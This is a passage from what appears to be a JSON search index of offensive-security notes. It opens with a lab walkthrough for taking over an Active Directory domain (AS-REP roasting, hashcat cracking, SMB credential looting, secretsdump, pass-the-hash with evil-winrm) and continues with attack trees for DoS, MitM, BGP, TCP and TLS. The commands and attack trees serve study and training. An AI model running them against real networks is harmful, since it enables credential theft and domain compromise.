# python GetNPUsers.py spookysec.local/svc-admin -no-pass Check what type of hash was retrieved: Kerberos 5 AS-REP etype 23 -> mode 18200 Crack the hash with the modified password list: # hashcat --force -m 18200 -a 0 svc-admin.hash /usr/share/wordlists/rockyou.txt Connect to the share using smbclient: smbclient '\\\\spookysec.local\\backup' -U svc-admin smb: \\> ls smb: \\> mget backup_credentials.txt exit Decode using base64 . We now have the credentials of the backup account. secretdump.py is part of impacket: cd /opt/impacket/examples python3 secretsdump.py spookysec.local/backup:FOUNDPASSWORDHERE@spookysec.local -just-dc-user Administrator Now we have the password: management2005 Enumerate the DC further  Map remote shares: $ smbclient -U spookysec.local/svc-admin -L //<IP target machine> Enter SPOOKYSEC.LOCAL\\svc-admin's password: And: $ smbclient -U spookysec.local/svc-admin //<IP target machine>/backup Enter SPOOKYSEC.LOCAL\\svc-admin's password: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Sat Apr 4 19:08:39 2020 .. D 0 Sat Apr 4 19:08:39 2020 backup_credentials.txt A 48 Sat Apr 4 19:08:53 2020 Get them backup credentials: smb: \\> get backup_credentials.txt It contains base64 encoded credentials. Decoding the base64 string reveals the credentials: $ echo \"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw\" | base64 -d [...]:backup2517860 Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account “backup” indicated it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes. Elevate privileges within the domain  Retrieve all password hashes that this user account (which is synced with the domain controller) has to offer. Exploiting this, we may have full control over the AD Domain. $ python secretsdump.py spookysec.local/backup:FOUNDPASSWORDHERE@spookysec.local -just-dc-user Administrator ... [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4876a80a723612986d7609aa5ebc12b::: ... Pass the Administrators NTLM hash with Evil-WinRM: $ evil-winrm -i <IP target machine> -u Administrator -H <Administrators NTLM hash> If on TryHackMe target, all flags are in the users desktops. The Administrator account has got acces to all. Tools  Impacket # git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket # pip3 install -r /opt/impacket/requirements.txt # cd /opt/impacket/ && python3 ./setup.py install Bloodhound # apt install bloodhound neo4j Kerbrute # chmod +x filename # mkdir /opt/kerbrute # cp kerbrute_linux_amd64 /opt/kerbrute/kerbrute",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1cb19610801daf9f8101b1333ef20e8d",
    "u": "https://network.tymyrddin.dev/docs/notes/manipulation",
    "t": "Packet manipulation ",
    "c": "Packet manipulation  Sniffing, analysing and inspecting packets, and forging and decoding packets. An nmap port scan may show a host as down or all of the ports as filtered . Analysing and inspecting packets over the network can help provide some insight as to what is going on with the connection attempts. PCAP files  Packet Capture or PCAP (also known as libpcap) is an application programming interface (API) that captures live network packet data from OSI model Layers 2-7. Network analysers like Wireshark create .pcap files to collect and record packet data from a network. Capture packets with tcpdump or Wireshark Analyse packets (packet tracing) Example  # tcpdump -i <interface> -w <file-name> # wireshark <filename> Sniffing  Depending on the network topology, there are many ways of gaining read-access to a network to conduct passive attacks. The most common method compromises a general purpose operating system on the segment and installs sniffer software that puts a network interface card in promiscuous mode and captures traffic. ARP/MAC spoofing may be necessary to sniff traffic on switched networks. Get into a good spot and gain local network access to a segment, tap a physical medium, or redirect traffic through a compromised host Sniff information (if possible, email traffic, FTP passwords, Web traffic, Telnet passwords, Router configuration, Chat sessions, DNS traffic) Forging and decoding packets  Scapy is a Python program that can assist with packet manipulation by forging and decoding packets. Scapy supports many use cases. Resources  The Art of Packet Crafting with Scapy!",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "82ba63377d61fbd168bfbcecc99b3b0a",
    "u": "https://network.tymyrddin.dev/docs/notes/incursions",
    "t": "Internet incursions ",
    "c": "Internet incursions  Hacking the heart of the Internet. IP spoofing  In an IP spoofing attack an external or internal adversary pretends to be using a trusted device by using the address of that device. This can be either an IP address within a range of trusted internal addresses for a network or an authorised external address that is trusted and allowed access to specified network resources. Spoofing an address might enable data to be sent through a router interface with filtering based on that address. IP address spoofing can be used to mask botnet device locations in DDoS attacks and to stage DrDoS attacks, and IP spoofing can also be used to bypass IP address-based authentication. Non-blind spoofing attack by gaining local network access to a segment and sniffing sequence numbers Blind spoofing attack which require calculating sequence numbers. Denial of Service (DoS)  The two most devastating variations of Denial of Service attacks are the distributed denial of service (DDoS) and the distributed deflection denial of service (DrDoS). Both types enlist the assistance of others, voluntary or not, to assist in the attack. This significantly increases the size of the attack, shields the source, and makes defending from it harder. 1 Physical destruction of machine (OR) 2 Link layer attacks (OR) 2.1 Protocol attack using link layer protocol (OR) 2.2 Physical link attack 3 ARP attacks (OR) 4 IP attacks (OR) 4.1 ICMP Message (OR) 4.1.1 Ping O' Death: Send one or more oversized ping packets (larger than 65,536 bytes) (OR) 4.1.2 Malformed 4.2 IP Fragmentation Attack 5 UDP attacks (OR) 6 TCP attacks (OR) 6.1 TCP SYN Flood: Trick target into thinking a session is being established by creating half-open connections (OR) 6.2 Connect() (OR) 6.3 LAST_ACK (OR) 6.4 New/undiscovered DoS against TCP 7 Application-Layer DoS (OR) 7.1 Telnet (OR) 7.2 SSH (OR) 7.3 SNMP (OR) 7.4 HTTP (OR) 7.4.1 HTTP Flood (OR) 7.4.2 Long form field submission through POST method (OR) 7.4.3 Partial requests (OR) 7.4.4 Junk HTTP GET and POST requests 7.5 Other application layer protocol Distributed Denial of Service (DDoS)  A DoS is distributed from only one starting point, whereas a DDoS implies several computers or servers. Amplification is dependent on the amount of zombies in the botnet used. In UDP spoofing the IP address of the packet (where it comes from) is replaced by the IP address of the target. The answers to the sent packets will thus come back to the target, and not to the attacker. Amplification is dependent on the number of zombies in the botnet and the used protocol (attack vector). Everything that works on UDP presents a good amplification factor and allows spoofing are prime candidates, such as game servers, timeservers (NTP) or Domain Name Servers. 1 UDP (User Datagram Protocol) spoofing 2 Create zombies 2.1 Voluntary “botnet” 2.2 Create a botnet 3 Launch DoS vector 3.1 UDP Flood (OR) 3.2 TCP SYN Flood (OR) 3.3 ICMP echo request Flood (OR) 3.4 ICMP directed broadcast (like smurf) 3.5 NTP Flood 3.6 Another UDP based protocol whose answers are longer than the questions Distributed Deflection Denial of Service (DrDoS)  In a DrDoS attack, the requests meant for a target are sent using systems earlier compromised. 1 IP spoofing of machines and servers (AND) 2 Attack 2.1 Call a large number of servers (DNS, NTP, Game servers) using a legitimate UDP request (amplification coefficient of between 20 and 50) (OR) 2.2 Call a large number of servers using a TCP SYN request (amplification coefficient of 10) On-path attack (alias MitM)  A Man-in-the-Middle (MitM) attack is a general term for when an adversary positions herself in the middle of a conversation (usually between a user and an application on the application or cryptograhic layer). A MitM attack allow an adversary to proxy communication between two parties allowing any data to either be read or altered. For example to eavesdrop or to steal personal information such as login credentials, account details, tokens and credit card numbers. This information can then further be used for unapproved fund transfers, password changes, impersonation, complete identity theft and for gaining a foothold during the infiltration stage of a structured hack. The adversary first subverts the address infrastructure (intercepts traffic). In passive interception forms, an adversary makes, for example, an infected Wi-Fi hotspot available to the public. Active forms use some sort of spoofing. After subverting the address infrastructure, any two-way encrypted traffic needs to be decrypted. This can be done by, for example, SSL spoofing(does not attack SSL itself, but the transition from non-encrypted to encrypted communications), spoofing HTTPS, an SSL BEAST attack, or hijacking SSL. Session replay and hijacking attacks can be used to bypass authentication. If a root certificate can be installed on the target, the adversary can replace it and maintain a secure connection. NetBIOS is outdated but still lives on in some older systems, sometimes for backward compatability. It is the equivalent of broadcasting names to look for each other but is not routable. It is local network only. If no one on the other network can use it for your network, then no one there can access your NetBIOS shared folders and printers, unless one has gained access to your local network. You can also access NetBIOS machines with a WINS server. That is the NetBIOS equivalent of a DNS server. 1 Subvert address infrastructure (AND) 1.1 L2 Spoofing 1.1.1 ARP/MAC spoofing (OR) 1.1.2 VLAN hopping (OR) 1.1.3 STP (RSTP, PVSTP, MSTP) spoofing 1.2 L3 Spoofing 1.2.1 SLAAC attack (OR) 1.2.2 Hijacking HSRP (VRRP, CARP) (OR) 1.2.3 Hijacking BGP (OR) 1.2.4 Routing table poisoning (OR) 1.2.5 Redirecting ICMP 1.3 L4+ Spoofing 1.3.1 NetBIOS (LLMNR) spoofing (OR) 1.3.2 DHCP spoofing (OR) 1.3.3 Rogue Access Point (OR) 1.3.4 IP spoofing (OR) 1.3.5 DNS spoofing 2 Decrypt (AND) 2.2 SSL BEAST (OR) 2.3 Hijack SSL (OR) 2.4 Strip SSL 3 Do whatever",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "de29a44abe7d52f575a573de0de506e6",
    "u": "https://network.tymyrddin.dev/docs/notes/raids",
    "t": "Transport raids ",
    "c": "Transport raids  Hacking the transport layer of the Internet: Despite attempts to make TCP as secure as possible, there still are some attacks that abuse it. Three major attacks are possible: Address spoofing, TCP sequence number prediction, and port scanning. And several minor attacks. Replay attack  The origin of a replay attack can be either internal or external to the running process. The destination of a replay attack can either be deflected, or sent straight through. Interleaving messages from one process are being injected concurrently into another process Classic Replays do not depend on the time of the session 1 External attack 1.1 Interleaving 1.1.1 Deflection 1.1.1.1 Reflection to sender 1.1.1.2 Deflection to third party 1.1.2 Straight replay 1.2 Classic replay 1.2.1 Deflection 1.2.1.1 Reflection to sender 1.2.1.2 Deflection to third party 1.2.2 Straight replay 2 Internal attack 2.1 Deflection 2.1.1 Reflection to sender 2.1.2 Deflection to third party 2.2 Straight replay TCP sequence number prediction attack  TCP suffers from well-known design flaws which make it possible to hijack or terminate applications that use it as their transport protocol. An SCP sequence prediction attack is an attempt to predict the sequence number used to identify the packets in a TCP connection, which can be used to forge packets, for example in a BGP Hijack. 1 Blind spoofing attack (OR) 1.1 Guess sequence number use (AND) 1.2 Inject valid message 2 Non-blind spoofing attack 2.1 Sniff traffic (AND) 2.2 Inject valid message based on sequence numbers Hijack session  Often two types of session hijacking are distinguished depending on how they are done. If the attacker directly gets involved with the target, it is called active hijacking, and if an attacker just passively monitors the traffic, it is called passive hijacking (but is really just sniffing). 1 Active 1.1 Silence the (usually client) device with a DoS (AND) 1.2 Take over the devices' position in the communication exchange between device and server (AND) 1.2.1 Use TCP sequence prediction attack 1.3 Create new user accounts on the network to gain access to the network later 2 Passive 2.1 Monitor the traffic between client and server 2.2 Discover valuable information or passwords BGP hijack  BGP hijacking happens often, there is no practical way to prevent it, we have to live with it. Internet routing was designed to be a conversation between trusted parties. HTTPS encryption is backed by SSL/TLS PKI, which itself trusts Internet routing. Routing announcements are accepted practically without any validation, creating the possibility of a network operator announcing someone else’s network prefixes without permission. Testing has shown that sending spoofed updates as a blind adversary is more difficult than thought, while launching this attack from a compromised/misconfigured router turned out relatively easy. A BGP hijack can be used to disable critical portions of the Internet by disrupting Internet routing tables, force a multi-homed AS to use an alternate path to/from an outside network instead of the preferred path, disable single-homed and multi-homed AS, to blackhole traffic and in on-path attacks. 1 Send from valid router (OR) 1.1 Misconfigured (OR) 1.2 Compromise router 2 Send from invalid router 2.1 Gag valid router (AND) 2.1.1 Kill router 2.1.1.1 Power Off/Physical Layer (OR) 2.1.1.2 Crash and prevent reboot (OR) 2.1.1.3 Conduct denial of service against router 2.1.2 Steal IP Address 2.1.2.1 ARP Spoof (OR) 2.1.2.2 Steal MAC 2.2 Introduce rogue router (Assume IP) 2.2.1 Steal IP Addr 2.2.2 More Specific Route Introduction 2.2.3 Establish unauthorized BGP session with peer 3 Send spoofed BGP Update from Non-Router 3.1 Conduct TCP Sequence Number Attack 3.2 Conduct Man-in-the-Middle 4 Craft BGP Message",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cc7e93e24cf75b7750d551040e7211e3",
    "u": "https://network.tymyrddin.dev/docs/roots/tls-ssl",
    "t": "TLS/SSL (for BGPsec) ",
    "c": "TLS/SSL (for BGPsec)  Table of Contents TLS/SSL (for BGPsec) Attack tree: Compromise TLS/SSL Security Attack tree: Compromise BGP via TLS/SSL Weaknesses Attack tree: Compromise TLS/SSL via BGPsec Weaknesses TLS version downgrade & weak cipher exploits Certificate spoofing & fake CA compromise Ransomware abuse of TLS for C2 Session hijacking via TLS renegotiation ALPACA & cross-protocol attacks TLS 1.3 Early Data (0-RTT) exploits Trends & takeaways Defence recommendations Thoughts Emerging threats Future defences Attack tree: Compromise TLS/SSL Security  (OR: Any branch succeeds) 1. Cryptographic Attacks Prerequisite: Support for weak algorithms/protocols (OR) 1.1 Key Exchange Compromise (AND) 1.1.1 Use of RSA/DH with <2048 bits 1.1.2 No PFS (Perfect Forward Secrecy) Example: Logjam (DH), ROBOT (RSA) 1.2 Cipher Suite Exploitation (OR) 1.2.1 CBC padding oracle (Lucky13 variants) 1.2.2 64-bit block cipher (Sweet32) Prerequisite: Legacy cipher support (AES-CBC, 3DES) 2. Protocol Exploits Prerequisite: Misconfigured TLS stack (OR) 2.1 Handshake Manipulation (OR) 2.1.1 TLS 1.3 downgrade to 1.2 (AND) Middlebox interference Client accepts fallback 2.1.2 0-RTT replay attacks (AND) TLS 1.3 early data enabled No replay protections 2.2 Cross-Protocol Attacks (AND) 2.2.1 Shared ports (HTTPS/SMTP) 2.2.2 Weak ALPN validation Example: ALPACA (2021) 3. Implementation Flaws Prerequisite: Unpatched libraries (OR) 3.1 Memory Corruption (AND) 3.1.1 Vulnerable OpenSSL (CVE-2022-3602) 3.1.2 Malicious packet injection 3.2 Side-Channel Leaks (OR) 3.2.1 Timing attacks (Minerva) 3.2.2 Power analysis (ROBOT) Prerequisite: Non-constant-time implementations 4. PKI Attacks Prerequisite: Weak certificate validation (OR) 4.1 CA Compromise (OR) 4.1.1 CA misissuance (Let's Encrypt CAA bypass) 4.1.2 Trust in legacy root CAs 4.2 Revocation Bypass (AND) 4.2.1 OCSP/CRL not enforced 4.2.2 Stapling not required 5. Post-Compromise Attacks Prerequisite: Session key exposure (AND) 5.1 Log encrypted traffic 5.2 Break encryption later (OR) 5.2.1 Quantum computing (store now/decrypt later) 5.2.2 Weak key generation Attack tree: Compromise BGP via TLS/SSL Weaknesses  (OR: Any branch below achieves the root goal) 1. Exploit Weak TLS Handshake in BGP Sessions Prerequisite: BGP routers use outdated TLS (OpenSSL 1.1.1 or older). (OR: Either sub-path works) 1.1. Downgrade BGP-over-TLS to Legacy Protocols (AND: Requires all conditions) 1.1.1. Attacker controls MITM position (ISP/IXP) 1.1.2. Router supports TLS 1.2 or lower (prerequisite: outdated TLS) 1.1.3. No TLS downgrade protection (missing HSTS for BGP APIs) 1.2. Force Weak Cipher Suites (AND: Requires all conditions) 1.2.1. Router accepts deprecated ciphers (AES-CBC-SHA) (prerequisite: outdated TLS) 1.2.2. Attacker modifies ClientHello to exclude strong ciphers 1.2.3. No cipher suite pinning enforced 2. Bypass Certificate Validation Prerequisite: Weak CA trust anchors (accepting legacy CAs). (OR: Either sub-path works) 2.1. Obtain Fraudulent BGP/TLS Certificate (AND: Requires all conditions) 2.1.1. Exploit CA misissuance (Let’s Encrypt CAA bypass) (prerequisite: weak CA trust) 2.1.2. Validate ownership via BGP hijack (fake ROA) (prerequisite: missing RPKI/ROV) 2.1.3. CA does not enforce IP ownership cross-checks 2.2. Disable Revocation Checks (AND: Requires all conditions) 2.2.1. Block OCSP/CRL requests (via DNS/BGP hijack) 2.2.2. Router ignores revocation status (stale CRL) (prerequisite: weak CA trust) 2.2.3. No OCSP stapling enforced 3. Exploit Implementation Vulnerabilities Prerequisite: BGP routers use outdated TLS libraries. (OR: Either sub-path works) 3.1. Memory Corruption in TLS Stack (AND: Requires all conditions) 3.1.1. Router uses vulnerable OpenSSL (CVE-2022-3602) (prerequisite: outdated TLS) 3.1.2. Attacker sends malformed packets (crafted ClientHello) 3.1.3. No exploit mitigations (ASLR, stack canaries) 3.2. Side-Channel Attack on BGP Router (AND: Requires all conditions) 3.2.1. Router leaks timing info (Minerva ECDSA flaw) (prerequisite: outdated TLS) 3.2.2. Attacker measures handshake response times 3.2.3. No constant-time crypto implemented 4. Attack BGP Management Plane (TLS-Enabled APIs) Prerequisite: Weak CA trust or misconfigured admin interfaces. (OR: Either sub-path works) 4.1. Spoof BGP Configuration API (AND: Requires all conditions) 4.1.1. Obtain rogue cert for bgp-manage.example.com (prerequisite: weak CA trust) 4.1.2. Router trusts public CAs for API authentication 4.1.3. No certificate pinning enforced 4.2. Exploit Web-Based BGP Tools (AND: Requires all conditions) 4.2.1. XSS in TLS-protected admin interface (prerequisite: misconfigured UI) 4.2.2. Admin user clicks malicious link 4.2.3. No CSP headers or input sanitization Attack tree: Compromise TLS/SSL via BGPsec Weaknesses  (OR: Any branch below achieves the root goal) 1. Exploit BGPsec-Validated Route Hijacking Prerequisite: Partial RPKI/BGPsec adoption (<100% deployment) (OR: Choose one sub-path) 1.1 BGPsec Key Compromise (AND: All required) 1.1.1 Attacker steals BGPsec router private key (via supply chain) 1.1.2 No HSM protection for keys 1.1.3 Weak key rotation policies 1.2 RPKI Misconfiguration Exploit (AND: All required) 1.2.1 ROA overlaps in RPKI database 1.2.2 Victim AS doesn't monitor route origins 1.2.3 Attacker can announce hijacked prefix 2. TLS Certificate Spoofing via BGPsec Prerequisite: CAs don't strictly validate IP ownership (OR: Choose one sub-path) 2.1 BGP-Hijacked IP Validation (AND: All required) 2.1.1 BGPsec-validated route hijack (from Branch 1) 2.1.2 CA accepts BGP-routed IPs for validation 2.1.3 No secondary ownership checks (WHOIS) 2.2 RPKI-TLS Trust Collision (AND: All required) 2.2.1 Malicious ROA for shared IP space 2.2.2 CA issues cert based on RPKI alone 2.2.3 No certificate transparency monitoring 3. BGPsec-Enabled MITM Attacks Prerequisite: Networks trust BGPsec-validated routes blindly (OR: Choose one sub-path) 3.1 Route Injection + TLS Strip (AND: All required) 3.1.1 BGPsec-validated malicious route 3.1.2 Victim accepts routes without additional checks 3.1.3 Middlebox strips TLS 1.3 to force HTTP 3.2 QUIC Redirection Attack (AND: All required) 3.2.1 BGPsec hijack of QUIC endpoint IPs 3.2.2 No QUIC connection migration validation 3.2.3 0-RTT enabled (allows replay) TLS version downgrade & weak cipher exploits  Attack Pattern Force connections to use older, vulnerable TLS versions (e.g., TLS 1.0/1.1) or weak ciphers (e.g., RC4, CBC). Enables decryption via known vulnerabilities (e.g., POODLE, BEAST). Real-World Examples 2022: Russian FSB “Reduced Security” Attacks: Downgraded EU government sites to TLS 1.0 to intercept diplomatic traffic. 2023: Magecart Skimming via Weak Ciphers: E-commerce sites using CBC-mode ciphers were exploited to inject credit card stealers. Why It Works Backward compatibility forces servers to accept weaker protocols. Legacy systems (POS, IoT) still rely on outdated TLS. Mitigation Disable TLS 1.0/1.1 and enforce TLS 1.2+. Use modern ciphers (AES-GCM, ChaCha20). Certificate spoofing & fake CA compromise  Attack Pattern: Issue fraudulent certificates via: Compromised CAs (hacked registrars). DNS hijacking to pass domain validation. Real-World Examples 2021: SolarWinds Hackers Spoof Microsoft Certificates: Used stolen Azure AD credentials to issue valid-looking certs for malware C2. 2023: Chinese APT “Cerberus” Forges Bank Certificates: Spoofed Asian bank domains with misissued Sectigo certs. Why It Works DV (Domain Validation) is weak—no org identity checks. Some CAs fail to revoke compromised certs quickly. Mitigation Use CAA records to restrict authorized CAs. Monitor CT logs (Certificate Transparency) for rogue certs. Ransomware abuse of TLS for C2  Attack Pattern Malware uses TLS-encrypted C2 channels to evade detection. Often leverages legitimate cloud services (AWS, GitHub) for blending in. Real-World Examples 2022: LockBit 3.0’s HTTPS C2: Used Let’s Encrypt certs to hide traffic in encrypted...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "82d3b45e96c818d7513ef77186ccea68",
    "u": "https://network.tymyrddin.dev/docs/roots/tcp",
    "t": "Transmission Control Protocol (TCP) ",
    "c": "Transmission Control Protocol (TCP)  Table of Contents Transmission Control Protocol (TCP) Attack tree: Compromise a target via TCP vulnerabilities Attack tree: Manipulate BGP routing by compromising TCP-based BGP sessions TCP Reflection/Amplification attacks RST/FIN Floods (State-Exhaustion attacks) TCP Zero-Window attacks (Resource Starvation) SYN Floods (Classic but Persistent) TCP Injection (In-Path adversaries) TCP Middlebox exploits (Policing Evasion) Low-Rate TCP attacks (Partial DoS) Trends and takeaways Defence recommendations Thoughts Emerging threats Emerging defence Attack tree: Compromise a target via TCP vulnerabilities  1. Exploit TCP Stack Vulnerabilities (OR) 1.1. Remote Code Execution (RCE) via TCP/IP flaws 1.2. Kernel memory corruption (SACK-based attacks) 2. Protocol-Level Attacks (OR) 2.1. Connection Hijacking (AND) 2.1.1. Off-path sequence number prediction 2.1.2. Malicious packet injection (RST/FIN spoofing) 2.2. Amplification/Reflection Attacks (OR) 2.2.1. TCP middlebox reflection 2.2.2. ACK/PSH flood abuse 3. Off-Path & Side-Channel Attacks (AND) 3.1. Blind In-Window Exploit (OR) 3.1.1. NAT Slipstreaming variants 3.1.2. Protocol downgrade attacks (QUIC-to-TCP) 3.2. Side-Channel Data Extraction (AND) 3.2.1. TCP timestamp analysis 3.2.2. Application data correlation 4. Cloud/Middlebox-Specific Attacks (OR) 4.1. Bypass Cloud Load Balancers (AND) 4.1.1. Crafted TCP segmentation evasion 4.1.2. Instance resource exhaustion 4.2. Stateful Firewall Evasion (OR) 4.2.1. TCP Fast Open (TFO) cache poisoning 4.2.2. Fragmentation overlap attacks 5. AI/ML-Enhanced Attacks (AND) 5.1. Traffic Fingerprinting (OR) 5.1.1. Encrypted traffic classification 5.1.2. SCADA system detection via flow patterns 5.2. Adversarial Traffic Generation (AND) 5.2.1. GAN-based normal traffic modeling 5.2.2. Stealthy DDoS payload synthesis Attack tree: Manipulate BGP routing by compromising TCP-based BGP sessions  BGP uses TCP (Transmission Control Protocol) as its transport layer protocol. TCP establishes a reliable, connection-oriented session between BGP peers (routers). BGP peers communicate default over TCP port 179. 1. Disrupt BGP Session Establishment (OR) 1.1. TCP SYN Flood Attack (Exhaust BGP Peer Resources) 1.2. Exploit BGP’s MD5 Authentication Weaknesses (OR) 1.2.1. Crack TCP-MD5 Hashes (if weak keys used) 1.2.2. Bypass MD5 via TCP Session Hijacking 2. Hijack Active BGP Sessions (AND) 2.1. Predict BGP TCP Sequence Numbers (OR) 2.1.1. Off-Path ISN Prediction (using timestamp leaks) 2.1.2. In-Window Guessing (due to poor ISN randomization) 2.2. Inject Malicious BGP Updates (OR) 2.2.1. Spoofed Route Advertisements 2.2.2. Crafted AS_PATH Manipulation 3. Exploit TCP Stack Vulnerabilities on BGP Routers (OR) 3.1. Trigger Kernel Crashes (DoS) (OR) 3.1.1. Exploit TCP SACK Handling (Linux CVE-2019-11477) 3.1.2. Abuse TCP Selective ACK (SACK) Resource Exhaustion 3.2. Remote Code Execution (RCE) via TCP/IP Stack (AND) 3.2.1. Exploit Router OS TCP Stack (JunOS, IOS XR flaws) 3.2.2. Deploy Malicious BGP Configurations Post-Exploit 4. Man-in-the-Middle (MITM) BGP Sessions (AND) 4.1. Intercept TCP Traffic (OR) 4.1.1. ARP/DNS Spoofing to Redirect BGP Traffic 4.1.2. BGP Peering Over Unencrypted Links (Internet Exchange Points) 4.2. Decrypt or Modify BGP Messages (OR) 4.2.1. Downgrade TCP-MD5 to Plaintext (if misconfigured) 4.2.2. Exploit Missing TCP-AO (Authentication Option) 5. Abuse BGP Session Persistence (OR) 5.1. Force BGP Session Resets via TCP Attacks (AND) 5.1.1. Inject RST Packets (Precision Spoofing) 5.1.2. Exploit TCP Keepalive Timeouts 5.2. Subvert BGP Graceful Restart (OR) 5.2.1. Spoof Graceful Restart Capabilities 5.2.2. Exhaust Router Memory During Recovery TCP Reflection/Amplification attacks  Pattern: Attackers abuse TCP-based protocols (e.g., SYN-ACK reflection via middlebox misconfigurations) to amplify traffic. Example: In 2022, attackers exploited misconfigured middleboxes (firewalls, load balancers) that responded to SYN packets with large SYN-ACK responses, enabling amplification. Why It Works: Many network devices ignore RFC standards, allowing spoofed SYN packets to trigger disproportionate responses. Mitigation: RFC 5358 (TCP Reflection Attacks) recommendations, such as filtering spoofed packets and disabling non-compliant middlebox behaviors. RST/FIN Floods (State-Exhaustion attacks)  Pattern: Attackers send spoofed RST or FIN packets to tear down legitimate TCP connections. Example: In 2023, a cloud provider faced outages due to RST floods targeting critical services, forcing session resets and degrading performance. Why It Works: Stateless firewalls often fail to validate RST/FIN sequence numbers, allowing blind connection resets. Mitigation: TCP sequence number validation (e.g., SYN cookies) and stateful inspection. TCP Zero-Window attacks (Resource Starvation)  Pattern: Attackers advertise a zero receive window, forcing servers to hold connections open indefinitely. Example: In 2021–2022, attackers targeted web servers (Apache/Nginx) by exhausting memory with zero-window stalls. Why It Works: Servers retain buffers for stalled connections, leading to OOM (Out-of-Memory) crashes. Mitigation: Aggressive timeouts for zero-window connections and dynamic window scaling adjustments. SYN Floods (Classic but Persistent)  Pattern: Still prevalent, using botnets to send high-volume SYN packets, exhausting server connection tables. Example: In 2023, a gaming company faced a 3.5 Tbps SYN flood from a Mirai-variant botnet. Why It Works: Default OS limits on half-open connections are easily overwhelmed. Mitigation: SYN cookies, rate limiting, and cloud-based scrubbing (e.g., AWS Shield/Azure DDoS Protection). TCP Injection (In-Path adversaries)  Pattern: Attackers inject malicious packets (e.g., data segments with malicious payloads) into live TCP streams. Example: In 2023, a nation-state actor hijacked BGP routes to inject TCP RSTs into VPN traffic (similar to the 2004 “NISCC TCP RST Attack” but modernized). Why It Works: Weak TCP sequence number randomness or BGP hijacking enables in-path insertion. Mitigation: Encryption (TLS), TCP-AO (Authentication Option), and BGP security (RPKI). TCP Middlebox exploits (Policing Evasion)  Pattern: Abuse of middlebox TCP optimizations (e.g., QoS prioritization) to evade rate limits. Example: In 2022, attackers used TCP option fields (e.g., MP-TCP) to bypass traffic-shaping policies. Why It Works: Middleboxes often prioritize certain TCP flags/options inconsistently. Mitigation: Strict traffic normalization and deep packet inspection (DPI). Low-Rate TCP attacks (Partial DoS)  Pattern: Slowloris-like attacks sending periodic TCP segments to keep connections alive without completing handshakes. Example: In 2024, API endpoints were targeted with low-rate TCP probes to evade traditional DDoS thresholds. Why It Works: Traditional volumetric DDoS defences miss slow, persistent attacks. Mitigation: AI-based anomaly detection and per-IP connection limits. Trends and takeaways  Shift to Application-Layer: Attacks increasingly blend TCP flaws with HTTP/HTTPS exploits (e.g., Slowloris + HTTP/2 Zero-Length Headers). Cloud Targeting: Attacks focus on cloud infra (AWS, Azure) where auto-scaling can amplify costs. Protocol Abuse: Exploiting middleboxes and RFC non-compliance is now common. Defence Evasion: Attackers use low-and-slow techniques to bypass traditional rate-limiting. Defence recommendations  For Networks: Deploy RFC-compliant middleboxes, enable TCP-AO, and use BGP monitoring. For Servers: Tune kernel TCP stack (e.g., net.ipv4.tcp_syncookies, tcp_max_syn_backlog). For Cloud: Leverage scalable DDoS protection (e.g., AWS Shield Advanced, Cloudflare Magic Transit). Thoughts  These patterns highlight the need for adaptive defences combining protocol hardening, behavioural analysis, and encryption. Emerging threats  TCP Fast Open (TFO) Exploits: DDoS amplification & session hijacking via SYN-data...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "584fd4fdfd263147c9c4c3275ab7d2dd",
    "u": "https://network.tymyrddin.dev/docs/notes/run-ins",
    "t": "Active directory run-ins ",
    "c": "Active directory run-ins  Active Directory is the directory service for Windows Domain Networks. Active Directory allows for the control and monitoring of computers through a single domain controller. It allows a single user to sign in to any computer on the active directory network and have access to his or her stored files and folders in the server, as well as the local storage on that machine. This allows for any user in the company to use any machine that the company owns, without having to set up multiple users on a machine. Active Directory does it all. Active Directory is very complex and securing it requires significant effort and years of experience. It is used by many companies and is a vital skill to comprehend when attacking Windows. The Active Directory structure includes three main tiers: 1) domains, 2) trees, and 3) forests. Several objects (users or devices) that all use the same database may be grouped in to a single domain. Multiple domains can be combined into a single group called a tree. Multiple trees may be grouped into a collection called a forest. Each one of these levels can be assigned specific access rights and communication privileges. Main concepts of an Active Directory  Directory – Contains all the information about the objects of the Active directory Object – An object references almost anything inside the directory (a user, group, shared folder…) Domain – The objects of the directory are contained inside the domain. Inside a “forest” more than one domain can exist and each of them will have their own objects collection. Tree – Group of domains with the same root. Example: dom.local, email.dom.local, www.dom.local Forest – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships. Active Directory provides different services, which fall under the umbrella of Active Directory Domain Services (AD DS): Domain Services – stores centralized data and manages communication between users and domains; includes login authentication and search functionality Certificate Services – creates, distributes, and manages secure certificates Lightweight Directory Services – supports directory-enabled applications using the open (LDAP) protocol Directory Federation Services – provides single-sign-on (SSO) to authenticate a user in multiple web applications in a single session Rights Management – protects copyrighted information by preventing unauthorized use and distribution of digital content DNS Service – Used to resolve domain names. AD DS is included with Windows Server (including Windows Server 10) and is designed to manage client systems. While systems running the regular version of Windows do not have the administrative features of AD DS, they do support Active Directory. This means any Windows computer can connect to a Windows workgroup, provided the user has the correct login credentials. Attack scenario  Scan the network No credentials/sessions Enumerate DNS (for example, with gobuster) Enumerate LDAP Poison the network (Responder; Relay attack; Evil-SSDP) OSINT Valid username but no passwords ASREPRoast Password spraying With credentials/sessions CMD powershell powerview Bloodhound Kerberos authentication  The Kerberos protocol is not a Microsoft invention, but Microsoft integrated their version of Kerberos in Windows2000, and it is now replacing NT Lan Manager (NTLM), which was a challenge-response authentication protocol. Kerberos uses stronger encryption, which improves the security as compared to NTLM. Transport layer  Kerberos uses UDP or TCP as transport protocol, which sends data in cleartext. Kerberos is responsible for providing encryption. Ports used by Kerberos are UDP/88 and TCP/88. Agents  The agents working together to provide authentication in Kerberos: Client or user who 